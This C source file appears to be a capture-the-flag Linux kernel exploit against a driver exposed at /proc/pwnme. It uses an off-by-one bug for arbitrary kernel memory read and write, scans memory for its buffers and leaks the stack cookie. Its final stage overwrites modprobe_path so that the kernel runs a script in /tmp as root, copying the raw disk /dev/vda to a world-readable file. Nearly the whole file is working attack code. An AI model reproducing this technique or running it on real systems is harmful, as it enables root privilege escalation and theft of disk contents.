#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <unistd.h>
#include <stdint.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/stat.h>


#define PROC "/proc/pwnme"
#define IOCTL_CREATE _IOW('p', 0, struct args_create)
#define IOCTL_SWITCH _IOW('p', 1, struct args_switch)

struct args_create { size_t size; };
struct args_switch { long index;  };

static const char *needle_str = "needle12";
uint64_t needle, bank_addr;
uint64_t cookie = 0xcafebabedeadbeef;
uint64_t gs_base;
uint64_t modprobe_path_noaslr = 0xffffffff8308b980;

#define NUM_LEAKS 4
uint64_t potential_leaks[NUM_LEAKS] = {
    0xffffffff8149eb34,
    0xffffffff8118abe0,
    0xffffffff81f1d839,
    0xffffffff81f18177,
};


#define COOKIE_OFFSET 0x28

int fd, cool_bank, ptmx, ret;

#define CHUNK_SIZE 0x40

void print_as_hex(char *s, size_t len) {
    for (size_t i = 0; i != len; i++) {
        printf("%x", s[i]);
    }
    printf("\n");
}

void ioctl_create(size_t size) {
    struct args_create arg = {
        .size = size
    };

    ret = ioctl(fd, IOCTL_CREATE, &arg);
    if (ret == -1) {
        printf("Error on ioctl create : %d\n", errno);
        exit(EXIT_FAILURE);
    } 
}

void ioctl_switch(long index) {
    struct args_switch arg = {
        .index = index
    };

    ret = ioctl(fd, IOCTL_SWITCH, &arg);
    if (ret == -1) {
        printf("Error on ioctl switch : %d\n", errno);
        exit(EXIT_FAILURE);
    }
}

void win() {
    uid_t uid = getuid();
    printf("[+] UID: %d\n", uid);
    exit(EXIT_SUCCESS);
}

struct sigaction sigact;


void register_sigsev() {
    sigact.sa_handler = win;
    sigemptyset(&sigact.sa_mask);
    sigact.sa_flags = 0;
    sigaction(SIGSEGV, &sigact, (struct sigaction*)NULL);
}


void init_leak_stack() {

    char buf[0x100] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0Hello world!";

    puts("Creating banks...");

    for (int i =0; i < 0x10; i++) {
        ioctl_create(0x100);
    }

    puts("[OK]");
    puts("Filling banks...");

    for (int i =0; i < 0x10; i++) {
        ioctl_switch(i);
        ret = write(fd, buf, 0x10);
        printf("write %d returns %d\n", i, ret);
    }
    puts("[OK]");
    puts("Trying to find the cool off-by-one bank...");

    for (int i = 0; i < 0x10; i++) {
        ((uint64_t *) buf)[0] = 0;
        ((uint64_t *) buf)[1] = 8;
        ioctl_switch(i);
        ret = write(fd, buf, 0x10);
        printf("write %x returns %d\n", i, ret);
        ioctl_switch(0x10);
        ret = read(fd, buf, 0x10);
        //printf("read %x returns %d\n", i, ret);
    }


    puts("The program should have crashed by now, if you see this then something's wrong.");
    exit(EXIT_FAILURE);

}

void create_tty() {
    ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    printf("ptmx: %d\n", ptmx);
}

void usage() {
    puts("./pwn stage [args]");
    exit(EXIT_FAILURE);
}

void place_needle_in_taskstruct() {
    prctl(PR_SET_NAME, needle_str, 0, 0, 0);
    needle = (uint64_t)(*needle_str);
}

int read_restrained(void *buf, uint64_t addr, size_t size) {
    uint64_t smallbuf[2];
    smallbuf[0] = addr;
    smallbuf[1] = size;
    ioctl_switch(cool_bank);
    ret = write(fd, smallbuf, 0x10);
    //printf("write returns %d\n", ret);
    if (ret != 16) {
        return -1;
    }


    ioctl_switch(0x10);
    ret = read(fd, buf, size);
    return ret;
}

int write_restrained(void *buf, uint64_t addr, size_t size) {
    uint64_t smallbuf[2];
    smallbuf[0] = addr;
    smallbuf[1] = size;
    ioctl_switch(cool_bank);
    ret = write(fd, smallbuf, 0x10);
    //printf("write returns %d\n", ret);
    if (ret != 16) {
        return -1;
    }


    ioctl_switch(0x10);
    ret = write(fd, buf, size);
    return ret;
}

void leak_cookie() {
    read_restrained(&cookie, gs_base + COOKIE_OFFSET, 8);
}

/**
 * Tries to find the bank in the memory, starting from start 
*/
void find_banks(uint64_t start) {
    int hundred_count = 0;
    uint64_t val;
    uint64_t bank_start;
    uint64_t cur = start;
    while (hundred_count < 0x10) {
        if (!(cur & 0xfff)) {
            printf("%lx\n", cur);
        }
        ret = read_restrained(&val, cur, 8);
        if ((ret == 8) && val == 0x100) {
            if (!hundred_count) {
                bank_start = cur - 8;
            }
            hundred_count++;
            cur += 8;
        }
        else {
            hundred_count = 0;
        }
        cur += 8;
    }
    printf("Found banks at %lx\n", bank_start);
    bank_addr = bank_start;
}

const char *toexecute = 
"#!/bin/sh\n"
"cat /dev/vda > /tmp/result\n"
"chmod 777 /tmp/result\n";


char *win_path = "/tmp/win";
char *dummy_file = "/tmp/dummy";


void attack_modprobe(uint64_t kernel_leak) {

    uint64_t modprobe_path = 0;

    for (int i = 0; i < NUM_LEAKS; i++) {
        if (!((potential_leaks[i] ^ kernel_leak) & 0xfff)) {
            modprobe_path = modprobe_path_noaslr - potential_leaks[i] + kernel_leak;
            break;
        }
    }

    write_restrained(win_path, modprobe_path, strlen(win_path) + 1);


    FILE *fptr = fopen(win_path, "w");
    if (!fptr) {
        puts("[!] Failed to open win");
        exit(-1);
    }

    if (fputs(toexecute, fptr) == EOF) {
        puts("[!] Failed to write win");
        exit(-1);
    }
    fclose(fptr);

    if (chmod(win_path, S_IXUSR) < 0) {
        puts("[!] Failed to chmod win condition");
        exit(-1);
    };

    fptr = fopen(dummy_file, "w");
    if (!fptr) {
        puts("[!] Failed to open dummy file");
        exit(-1);
    }

    puts("[*] Writing dummy file...");
    if (fputs("\x37\x13\x42\x42", fptr) == EOF) {
        puts("[!] Failed to write dummy file");
        exit(-1);
    }
    fclose(fptr);
    if (chmod(dummy_file, S_IXUSR) < 0) {
        puts("[!] Failed to chmod dummy file condition");
        exit(-1);
    };

    char *argv[] = {dummy_file, NULL};

    ret = execv(dummy_file, argv);
    printf("Return code for exec: %d\n", ret);

    puts("[?] Hopefully GG");


}

int main(int argc, char const *argv[]) {

    char buf[0x100];
    uint64_t addr;
    size_t size;
    
    setvbuf(stdout,0,_IONBF,0);
    setvbuf(stdin,0,_IONBF,0);

    memset(buf, 0, sizeof(buf));

    register_sigsev();
    
    fd = open(PROC, O_RDWR);
    if (fd < 0) {
        printf("Failed to open proc : %d\n", errno);
        exit(EXIT_FAILURE);
    }


    if (argc == 1) {
        usage();
    }

    int stage = atoi(argv[1]);
    switch (stage) {
        case 0:
            init_leak_stack();
            break;
        case 1:
            create_tty();
            break;
        case 2:
            if (argc != 4 && argc != 5) {
                printf("./pwn %d cool_bank addr [size]\n", stage);
                exit(EXIT_FAILURE);
            }
            cool_bank = strtol(argv[2], NULL, 0);
            addr = strtoull(argv[3], NULL, 0);

            size = 0x100;
            if (argc == 5) {
                size = strtoull(argv[4], NULL, 0);
            }

            ret = read_restrained(buf, addr, size);
            printf("read returns %d\n", ret);
            for (int i = 0; i < 0x10; i++) {
                printf("%lx\n", ((uint64_t *)buf)[i]);
            }
            break;
        case 3:
            if (argc != 4 && argc != 5 && argc != 6) {
                printf("./pwn %d cool_bank addr [size   [gs_base]] \n", stage);
                exit(EXIT_FAILURE);
            }
            cool_bank = strtol(argv[2], NULL, 0);
            addr = strtoull(argv[3], NULL, 0);

            size = 0x100;
            if (argc >= 5) {
                size = strtoull(argv[4], NULL, 0);
            }

            if (argc >= 6) {
                gs_base = strtoull(argv[5], NULL, 0);
                leak_cookie();
                printf("Cookie found : %lx\n", cookie);
            }

            for (int i = 0; i < 0x10; i++) {
                ((uint64_t *)buf)[i] = cookie;
            }

            ret = write_restrained(buf, addr, size);
            printf("write returns %d\n", ret);
            break;

        case 4:
            if (argc != 4) {
                printf("./pwn %d cool_bank addr\n", stage);
                exit(EXIT_FAILURE);
            }
            cool_bank = strtol(argv[2], NULL, 0);
            addr = strtoull(argv[3], NULL, 0);
            find_banks(addr);
            break;
        case 5:
        if (argc != 4) {
                printf("./pwn %d cool_bank kernel_leak\n", stage);
                exit(EXIT_FAILURE);
            }
            cool_bank = strtol(argv[2], NULL, 0);
            uint64_t kernel_leak = strtoull(argv[3], NULL, 0);
            attack_modprobe(kernel_leak);
            break;
        default:
            printf("Unknown stage: %d\n", stage);
            exit(EXIT_FAILURE);
    }

    win();

    return 0;
}
